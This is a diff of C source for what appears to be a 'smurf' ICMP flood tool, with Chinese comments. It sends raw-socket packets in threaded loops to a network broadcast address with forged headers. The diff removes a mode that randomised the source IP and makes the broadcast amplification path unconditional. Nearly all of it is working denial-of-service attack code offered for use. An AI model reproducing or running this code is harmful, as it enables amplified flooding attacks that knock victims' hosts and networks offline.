@@ -19,9 +19,6 @@
 /* 原始套接字 */
 int sockfd;
 
-/* mode */
-char mode;
-
 /* 程序活動標誌 */
 static int alive = -1;
 
@@ -51,9 +48,9 @@ void *attack(void *addr_info){
     // packet length
     len = sizeof(struct iphdr) + sizeof(struct icmphdr);
 
-    if(mode == 'S' || mode == 's')     icmp_init_header(&ip_hdr, &icmp_hdr, dst_ip, brc_ip, 'S');
-    else icmp_init_header(&ip_hdr, &icmp_hdr, dst_ip, (char *)NULL, 'P');
+
     //  ------------- DeBug-----------------------
+    // icmp_init_header(&ip_hdr, &icmp_hdr, dst_ip, brc_ip);
     // char test_ip[20] = {0};
     // inet_ntop(AF_INET, &ip_hdr.saddr,test_ip, sizeof(test_ip));
     // printf("source IP = %s\n", test_ip);
@@ -63,7 +60,6 @@ void *attack(void *addr_info){
     // ----------------------------------------------
 
     while(alive){
-        if(mode != 'S' || mode != 's')  ip_hdr.saddr = rand();
         // ip checksum
     	bzero(buf, sizeof(buf));
 	    memcpy(buf, &ip_hdr, sizeof(struct iphdr));
@@ -99,7 +95,6 @@ void sig_int(int signo){
 int main(int argc, char *argv[]){
     struct sockaddr_in addr;
     struct hostent *host = NULL;
-    mode = (char)* argv[2];
 
     int i = 0;
     pthread_t pthread[MAXCHILD];
@@ -111,8 +106,8 @@ int main(int argc, char *argv[]){
     signal(SIGINT, sig_int);
 
     /* 参數是否數量正鴂 */
-    if(argc < 3 || argc > 3){
-	printf("usage: smurf <IPaddress> <mode>\n");
+    if(argc < 2 || argc > 2){
+	printf("usage: smurf <IPaddress>\n");
 	exit(1);
     }
 
@@ -122,12 +117,10 @@ int main(int argc, char *argv[]){
     addr.sin_family = AF_INET;
     addr.sin_port = htons(0);
 
-    if(mode == 'S' || mode == 's'){
-        getBroadcastIP(&addr);
-        addr.sin_addr.s_addr = inet_addr(brc_ip);
-    }
-     printf("%c\n", mode);
-     Pause();
+    getBroadcastIP(&addr);
+    // printf("%s\n", brc_ip);
+    // Pause();
+    addr.sin_addr.s_addr = inet_addr(brc_ip);
 
 
     /* 建立原始socket */
@@ -137,7 +130,7 @@ int main(int argc, char *argv[]){
 	exit(1);
     }
     /* 設置IP選項 */
-    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast_pings, sizeof(broadcast_pings)) < 0){
+    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, &broadcast_pings, sizeof(broadcast_pings)) < 0){
 		perror("setsockopt()");
 		exit(1);
 	}  
